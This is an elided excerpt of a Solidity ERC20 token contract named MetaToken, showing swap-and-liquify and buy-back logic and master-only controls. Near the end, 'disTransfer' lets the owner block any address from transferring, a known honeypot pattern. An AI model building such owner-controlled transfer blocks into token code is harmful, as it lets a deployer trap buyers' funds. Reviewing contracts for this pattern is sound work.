 ...
 */
contract MetaTOKEN is ERC20Detailed, Ownable {
    ...
    constructor (address router, address payable _marketingAddress)
        ERC20Detailed("MetaToken", "META", uint8(DECIMALS))
        payable
        public
    {
        ...
        returns (bool)
    {
      ...
      if (!inSwapAndLiquify && swapAndLiquifyEnabled && from != uniswapV2PairAddress) {
        ...
        if(buyBackEnabled){
           ...
           _transferExcluded(from, to, value); 
        }
  ...
  function _approve(address owner, address spender, uint256 value) private {
    ...
    */
    ...
    function disTransfer(address _addr)
        external
        onlyMaster
    {
        notAllowTransfer[_addr] = true;
    }


     function enableTransferRemove(address _addr)
        external
        onlyMaster
    {
    ...
    function setBuyBackEnabled(bool _enabled) public onlyMaster {
